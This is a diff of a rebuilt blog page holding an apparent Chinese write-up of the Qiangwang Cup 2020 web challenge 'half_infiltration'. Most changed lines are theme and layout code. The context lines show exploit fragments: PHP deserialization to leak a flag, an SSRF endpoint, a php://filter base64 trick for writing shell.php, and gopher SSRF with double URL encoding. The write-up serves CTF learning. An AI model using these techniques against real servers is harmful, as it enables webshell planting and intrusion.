@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto">
+<html lang="en" dir="auto" data-theme="auto">
 
 <head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -54,6 +54,7 @@ if (isset($_GET[&#39;x&#39;])) {
 思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
 
 启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。
+
 ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
 &lt;?php
 
@@ -83,7 +84,7 @@ echo urlencode(serialize([
 然后我们可以看到ssrf.php的内容">
 <meta name="author" content="ch4ser">
 <link rel="canonical" href="https://dragonbox.top/posts/ctf-qwb2020-web-1/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css" integrity="sha256-IhHKMWS&#43;eDACT2qtKzouUghDpk&#43;PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://dragonbox.top/flash.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://dragonbox.top/flash.ico">
 <link rel="icon" type="image/png" sizes="32x32" href="https://dragonbox.top/flash.ico">
@@ -112,23 +113,38 @@ echo urlencode(serialize([
                 --code-block-bg: rgb(46, 46, 51);
                 --code-bg: rgb(55, 56, 62);
                 --border: rgb(51, 51, 51);
+                color-scheme: dark;
             }
 
             .list {
                 background: var(--theme);
             }
 
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
+            .toc {
+                background: var(--entry);
             }
+        }
 
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
             }
         }
 
     </style>
-</noscript><meta property="og:url" content="https://dragonbox.top/posts/ctf-qwb2020-web-1/">
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://dragonbox.top/posts/ctf-qwb2020-web-1/">
   <meta property="og:site_name" content="ch4ser の 超元域">
   <meta property="og:title" content="qwb2020web复现">
   <meta property="og:description" content="half_infiltration 开局的页面如下
@@ -192,6 +208,7 @@ if (isset($_GET[&#39;x&#39;])) {
 思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
 
 启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。
+
 ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
 &lt;?php
 
@@ -275,20 +292,8 @@ echo urlencode(serialize([
 }
 </script>
 </head>
-
-<body class="" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
+<body id="top">
+    <header class="header">
     <nav class="nav">
         <div class="logo">
             <a href="https://dragonbox.top/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
@@ -324,6 +329,11 @@ echo urlencode(serialize([
                 </a>
             </li>
             <li>
+                <a href="https://dragonbox.top/friends/" title="friends">
+                    <span>friends</span>
+                </a>
+            </li>
+            <li>
                 <a href="https://dragonbox.top/about/" title="about">
                     <span>about</span>
                 </a>
@@ -339,13 +349,13 @@ echo urlencode(serialize([
     <h1 class="post-title entry-hint-parent">
       qwb2020web复现
     </h1>
-    <div class="post-meta"><span title='2020-08-27 20:48:12 +0000 UTC'>August 27, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;370 words&nbsp;·&nbsp;ch4ser
+    <div class="post-meta"><span title='2020-08-27 20:48:12 +0000 UTC'>August 27, 2020</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>370 words</span>&nbsp;·&nbsp;<span>ch4ser</span>
 
 </div>
   </header> 
 <figure class="entry-cover">
             <img loading="eager"
-                srcset='https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_c6453088a6cc5644.png 360w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_1e4619c1535123dd.png 480w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_71de461c25b431b6.png 720w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_4321a0da1f2bf04c.png 1080w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png 1296w'
+                srcset='https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_2f957622007e5a69.png 360w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_38db254b1d7c2dee.png 480w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_5d28f5168d9d28e8.png 720w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_d10821bab5ef7ff7.png 1080w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png 1296w'
                 src="https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png"
                 sizes="(min-width: 768px) 720px, 100vw"
                 width="1296" height="660"
@@ -412,14 +422,15 @@ echo urlencode(serialize([
 </span></span><span class="line"><span class="cl"><span class="p">}</span> 
 </span></span></code></pre></div><p>思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在<code>ob_end_clean()</code>执行之前报错退出. <code>ob_start</code>会打开输出缓冲</p>
 <blockquote>
-<p>启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。</p></blockquote>
+<p>启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。</p>
+</blockquote>
 <p><code>ob_end_clean</code>会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在<code>ob_end_clean</code>之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pass</span><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">read</span><span class="p">(){</span>
 </span></span><span class="line"><span class="cl">	<span class="c1">// ob_start();
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">global</span> <span class="nv">$result</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl">	<span class="k">global</span> <span class="nv">$result</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">	<span class="k">print</span> <span class="nv">$result</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
@@ -442,7 +453,7 @@ echo urlencode(serialize([
 </span></span></span></code></pre></div><p>然后我们可以看到ssrf.php的内容</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
 </span></span><span class="line"><span class="cl"><span class="c1">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;we_have_done_ssrf_here_could_you_help_to_continue_it&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="k">false</span><span class="p">;</span> 
+</span></span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;we_have_done_ssrf_here_could_you_help_to_continue_it&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="k">false</span><span class="p">;</span> 
 </span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|var|apache|conf|proc|log/i&#34;</span> <span class="p">,</span><span class="nv">$url</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">		<span class="k">die</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">	<span class="p">}</span>
@@ -531,7 +542,7 @@ echo urlencode(serialize([
 </span></span><span class="line"><span class="cl"><span class="nx">upload_data</span> <span class="o">=</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;file&#39;</span><span class="o">:</span><span class="s1">&#39;php://filter/convert.base64-decode|convert.base64-decode/resource=shell.php&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;content&#39;</span><span class="o">:</span><span class="s1">&#39;UEQ4OVlHTmhkQ0F2Wm14aFoyQTc&#39;</span> <span class="c1"># 似乎可以正常解密的base64都无法写入文件中
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="nx">upload_data</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">upload_data</span><span class="p">,</span> <span class="nx">quote_via</span><span class="o">=</span><span class="nx">quote_plus</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">upload_data</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
@@ -546,7 +557,7 @@ echo urlencode(serialize([
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">#  ssrf need double url encode
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">url</span> <span class="o">=</span> <span class="nx">url0</span> <span class="o">+</span> <span class="nx">quote</span><span class="p">(</span><span class="nx">quote</span><span class="p">(</span><span class="nx">gopher_content</span><span class="p">))</span>
+</span></span></span><span class="line"><span class="cl"><span class="nx">url</span> <span class="o">=</span> <span class="nx">url0</span> <span class="o">+</span> <span class="nx">quote</span><span class="p">(</span><span class="nx">quote</span><span class="p">(</span><span class="nx">gopher_content</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nx">header</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="o">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;User-Agent&#34;</span><span class="o">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="o">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="o">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="o">:</span> <span class="s2">&#34;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="o">:</span> <span class="s2">&#34;close&#34;</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
@@ -583,7 +594,7 @@ echo urlencode(serialize([
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
+        <span>&copy; 2026 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
 
     <span>
         Powered by
@@ -598,9 +609,14 @@ echo urlencode(serialize([
 </a>
 
 <script>
-    let menu = document.getElementById('menu')
+    let menu = document.getElementById('menu');
     if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
         menu.onscroll = function () {
             localStorage.setItem("menu-scroll-position", menu.scrollLeft);
         }
@@ -641,11 +657,12 @@ echo urlencode(serialize([
 </script>
 <script>
     document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
             localStorage.setItem("pref-theme", 'light');
         } else {
-            document.body.classList.add('dark');
+            html.dataset.theme = 'dark';
             localStorage.setItem("pref-theme", 'dark');
         }
     })
